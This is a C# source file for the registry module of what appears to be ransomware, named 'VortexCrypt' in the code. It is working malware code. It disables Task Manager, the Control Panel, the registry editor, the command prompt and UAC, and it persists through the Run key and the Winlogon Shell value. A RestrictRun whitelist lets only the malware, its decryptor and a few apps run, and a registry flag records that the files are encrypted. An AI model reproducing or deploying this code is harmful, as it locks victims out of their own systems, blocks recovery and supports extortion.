using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace VortexSecOps
{
    namespace Regedit_Set
    {
        public interface IRegistryConfigurer
        {
            /// <summary>
            /// 判断文件是否被加密
            /// </summary>
            /// <param name="createEncryped">true 标记为加密，默认为false</param>
            /// <returns>true为已加密，false为未加密</returns>
            bool IsDataEncryptedByAes(bool createEncryped = false);
            /// <summary>
            /// 从 Windows 注册表的开机启动项中移除指定的应用程序。
            /// </summary>
            /// <param name="appName">要从开机启动项中移除的应用程序的名称。
            /// 该名称应与之前添加到开机启动项时使用的名称一致。</param>
            void RemoveFromStartup(string appName);
            /// <summary>
            /// 将指定的应用程序添加到 Windows 注册表的开机启动项中。
            /// </summary>
            /// <param name="appName">要添加到开机启动项的应用程序的名称。
            /// 此名称将显示在注册表的开机启动项列表中。</param>
            /// <param name="appPath">要添加到开机启动项的应用程序的完整路径。
            /// 该路径应指向应用程序的可执行文件。</param>
            void AddToStartup(string appName, string appPath);
            /// <summary>
            /// 根据传入的参数值，禁用或启用系统的命令提示符（CMD）。
            /// </summary>
            /// <param name="configValue">用于配置 CMD 状态的整数值。2 表示完全禁用，0 表示启用。</param>
            void ConfigureCMD(int configValue);
            /// <summary>
            /// 禁用注册表编辑器
            /// </summary>
            /// <param name="disableFlag">决定状态的标志，默认值为 1（禁用）</param>
            void DisableRegistryEdit(int disableFlag = 1);
            /// <summary>
            /// 禁用控制面板和任务管理器
            /// </summary>
            /// <param name="disableFlag">决定状态的标志，默认值为 1（禁用）</param>
            void DisableSysSettings(int disableFlag = 1);
            /// <summary>
            /// 根据布尔值启用或禁用 Windows 功能限制
            /// </summary>
            /// <param name="enableRestriction">是否启用限制的布尔值</param>
            void ApplyWinRestricts(bool enableRestriction);
            /// <summary>
            /// 配置启动程序
            /// </summary>
            /// <param name="startupProgram">要设置的启动程序名称</param>
            void ConfigStartupProg(string startupProgram);

            /// <summary>
            /// 关闭用户账户控制（UAC）
            /// </summary>
            void DisableUAC();
        }

        // 操作Windows注册表以调整系统设置
        public class RegistryConfigurer : IRegistryConfigurer
        {
            // 禁用控制面板和任务管理器，参数a决定状态，默认禁用
            private RegistryConfigurer() { }
            public static IRegistryConfigurer Create()
            {
                return new RegistryConfigurer();
            }
            void IRegistryConfigurer.DisableSysSettings(int disableFlag)
            {
                RegistryKey currentUserKey = null;
                RegistryKey controlPanelKey = null;
                RegistryKey taskManagerKey = null;
                const string EXPLORER_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                const string SYSTEM_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                try
                {
                    currentUserKey = Registry.CurrentUser;
                    controlPanelKey = currentUserKey.CreateSubKey(EXPLORER_POLICIES_PATH);
                    controlPanelKey.SetValue("NoControlPanel", disableFlag);
                    taskManagerKey = currentUserKey.CreateSubKey(SYSTEM_POLICIES_PATH);
                    taskManagerKey.SetValue("DisableTaskMgr", disableFlag);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (taskManagerKey != null)
                    {
                        taskManagerKey.Close();
                    }
                    if (controlPanelKey != null)
                    {
                        controlPanelKey.Close();
                    }
                    if (currentUserKey != null)
                    {
                        currentUserKey.Close();
                    }
                }
            }

            // 禁用注册表编辑器，参数disableFlag决定状态，默认禁用
            void IRegistryConfigurer.DisableRegistryEdit(int disableFlag)
            {
                RegistryKey currentUserKey = null;
                RegistryKey systemPoliciesKey = null;
                try
                {
                    currentUserKey = Registry.CurrentUser;
                    const string System = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                    systemPoliciesKey = currentUserKey.OpenSubKey(System, true);
                    if (systemPoliciesKey == null)
                    {
                        systemPoliciesKey = currentUserKey.CreateSubKey(System);
                    }
                    systemPoliciesKey.SetValue("DisableRegistryTools", disableFlag);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (systemPoliciesKey != null)
                    {
                        systemPoliciesKey.Close();
                    }
                    if (currentUserKey != null)
                    {
                        currentUserKey.Close();
                    }
                }
            }

            // 关闭用户账户控制（UAC）
            void IRegistryConfigurer.DisableUAC()
            {
                // 定义注册表中 System 策略子键的路径常量
                const string SYSTEM_POLICIES_PATH = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                // 定义要设置的注册表值名称常量，用于控制 UAC 功能
                const string ENABLE_LUA_VALUE_NAME = "EnableLUA";

                RegistryKey localMachineKey = null;
                RegistryKey systemPoliciesKey = null;
                try
                {
                    // 打开当前用户的注册表根键
                    localMachineKey = Registry.LocalMachine;
                    // 尝试以可写方式打开 System 策略子键
                    systemPoliciesKey = localMachineKey.OpenSubKey(SYSTEM_POLICIES_PATH, true);
                    // 若子键不存在，则创建该子键
                    if (systemPoliciesKey == null)
                    {
                        systemPoliciesKey = localMachineKey.CreateSubKey(SYSTEM_POLICIES_PATH);
                    }
                    // 将 EnableLUA 的值设置为 0，以关闭 UAC
                    systemPoliciesKey.SetValue(ENABLE_LUA_VALUE_NAME, 0);
                }
                catch (Exception)
                { }
                finally
                {
                    // 若 software 子键已打开，则关闭它
                    if (systemPoliciesKey != null)
                    {
                        systemPoliciesKey.Close();
                    }
                    // 若当前用户根键已打开，则关闭它
                    if (localMachineKey != null)
                    {
                        localMachineKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.ConfigStartupProg(string startupProgram)
            {
                // Winlogon 注册表子键路径常量
                const string WINLOGON_SUBKEY_PATH = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
                // 注册表值名称常量
                const string SHELL_VALUE_NAME = "Shell";

                RegistryKey localMachineKey = null;
                RegistryKey winlogonKey = null;
                try
                {
                    // 打开 HKEY_LOCAL_MACHINE 根键
                    localMachineKey = Registry.LocalMachine;
                    // 尝试打开 Winlogon 子键
                    winlogonKey = localMachineKey.OpenSubKey(WINLOGON_SUBKEY_PATH, true);
                    // 若不存在则创建
                    if (winlogonKey == null)
                    {
                        winlogonKey = localMachineKey.CreateSubKey(WINLOGON_SUBKEY_PATH);
                    }
                    // 设置 Shell 值
                    winlogonKey.SetValue(SHELL_VALUE_NAME, startupProgram);
                }
                finally
                {
                    // 关闭子键
                    if (winlogonKey != null)
                    {
                        winlogonKey.Close();
                    }
                    // 关闭根键
                    if (localMachineKey != null)
                    {
                        localMachineKey.Close();
                    }
                }
            }

            // 根据布尔值enableRestriction启用或禁用Windows功能限制
            void IRegistryConfigurer.ApplyWinRestricts(bool enableRestriction)
            {
                RegistryKey currentUserKey = null;
                RegistryKey explorerPoliciesKeyForRestrictRun = null;
                RegistryKey explorerPoliciesKeyForAllowedProgs = null;
                const string WINDOWS_EXPLORER_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                if (enableRestriction)
                {
                    try
                    {
                        currentUserKey = Registry.CurrentUser;
                        explorerPoliciesKeyForRestrictRun = currentUserKey.CreateSubKey(WINDOWS_EXPLORER_POLICIES_PATH);
                        explorerPoliciesKeyForRestrictRun.SetValue("RestrictRun", 1);
                        explorerPoliciesKeyForAllowedProgs = currentUserKey.CreateSubKey($"{WINDOWS_EXPLORER_POLICIES_PATH}\\RestrictRun");
                        // 添加允许运行的程序列表
                        string[] allowedPrograms = {
                    Process.GetCurrentProcess().ProcessName + ".exe",
                    "msedge.exe",
                    "WeChat.exe",
                    "shutdown.exe",
                    "ReAgentc.exe",
                    "Rundl132.exe",
                    "@Vortex_decryptor.exe",
                    "notepad.exe"
                    };
                        foreach (string program in allowedPrograms)
                        {
                            explorerPoliciesKeyForAllowedProgs.SetValue(program, program);
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                    finally
                    {
                        if (explorerPoliciesKeyForRestrictRun != null)
                        {
                            explorerPoliciesKeyForRestrictRun.Close();
                        }
                        if (explorerPoliciesKeyForAllowedProgs != null)
                        {
                            explorerPoliciesKeyForAllowedProgs.Close();
                        }
                        if (currentUserKey != null)
                        {
                            currentUserKey.Close();
                        }
                    }
                }
                else
                {
                    try
                    {
                        currentUserKey = Registry.CurrentUser;
                        explorerPoliciesKeyForRestrictRun = currentUserKey.CreateSubKey(WINDOWS_EXPLORER_POLICIES_PATH);
                        explorerPoliciesKeyForRestrictRun.DeleteValue("RestrictRun");
                    }
                    catch (Exception)
                    {

                    }
                    finally
                    {
                        if (explorerPoliciesKeyForRestrictRun != null)
                        {
                            explorerPoliciesKeyForRestrictRun.Close();
                        }
                        if (currentUserKey != null)
                        {
                            currentUserKey.Close();
                        }
                    }
                }
            }
            void IRegistryConfigurer.ConfigureCMD(int configValue)
            {
                const string registryPath = @"Software\Policies\Microsoft\Windows\System";
                const string registryValueName = "DisableCMD";
                RegistryKey cmdRegistryKey = null;
                try
                {
                    cmdRegistryKey = Registry.CurrentUser.OpenSubKey(registryPath, true);
                    if (cmdRegistryKey == null)
                    {
                        cmdRegistryKey = Registry.CurrentUser.CreateSubKey(registryPath);
                    }
                    cmdRegistryKey.SetValue(registryValueName, configValue, RegistryValueKind.DWord);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                finally
                {
                    if (cmdRegistryKey != null)
                    {
                        cmdRegistryKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.AddToStartup(string appName, string appPath)
            {
                const string startupRegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey registryKey = null;
                try
                {
                    registryKey = Registry.LocalMachine.OpenSubKey(startupRegistryPath, true);
                    if (registryKey == null)
                    {
                        registryKey = Registry.LocalMachine.CreateSubKey(startupRegistryPath);
                    }
                    registryKey.SetValue(appName, appPath, RegistryValueKind.String);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (registryKey != null)
                    {
                        registryKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.RemoveFromStartup(string appName)
            {
                const string startupRegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey registryKey = null;
                try
                {
                    registryKey = Registry.LocalMachine.OpenSubKey(startupRegistryPath, true);
                    if (registryKey != null && registryKey.GetValue(appName) != null)
                    {
                        registryKey.DeleteValue(appName);
                    }
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (registryKey != null)
                    {
                        registryKey.Close();
                    }
                }
            }
            bool IRegistryConfigurer.IsDataEncryptedByAes(bool createEncryped)
            {
                RegistryKey localMachineKey = null;
                RegistryKey encrypted = null;
                string appName = "VortexCrypt";
                string encryptedFlagValueName = "FilesEncrypted";
                const int hexValue = 346892;

                if (Environment.Is64BitProcess)
                {
                    try
                    {
                        localMachineKey = Registry.LocalMachine;
                        encrypted = localMachineKey.CreateSubKey($"SOFTWARE\\{appName}");
                        object value = encrypted.GetValue(encryptedFlagValueName);
                        if (value == null || Convert.ToInt32(value) != hexValue)
                        {
                            if (createEncryped == true)
                            {
                                encrypted.SetValue(encryptedFlagValueName, hexValue, RegistryValueKind.DWord);
                            }
                            return false;
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return false;
                    }
                    finally
                    {
                        if (encrypted != null)
                        {
                            encrypted.Close();
                        }
                        if (localMachineKey != null)
                        {
                            localMachineKey.Close();
                        }
                    }
                }
                else
                {
                    try
                    {
                        localMachineKey = Registry.LocalMachine;
                        encrypted = localMachineKey.CreateSubKey($"SOFTWARE\\WOW6432Node\\{appName}");
                        object value = encrypted.GetValue(encryptedFlagValueName);
                        if (value == null || Convert.ToInt32(value) != hexValue)
                        {
                            if (createEncryped == true)
                            {
                                encrypted.SetValue(encryptedFlagValueName, hexValue, RegistryValueKind.DWord);
                            }
                            return false;
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return false;
                    }
                    finally
                    {
                        if (encrypted != null)
                        {
                            encrypted.Close();
                        }
                        if (localMachineKey != null)
                        {
                            localMachineKey.Close();
                        }
                    }
                }
                return true;
            }
        }
    }
}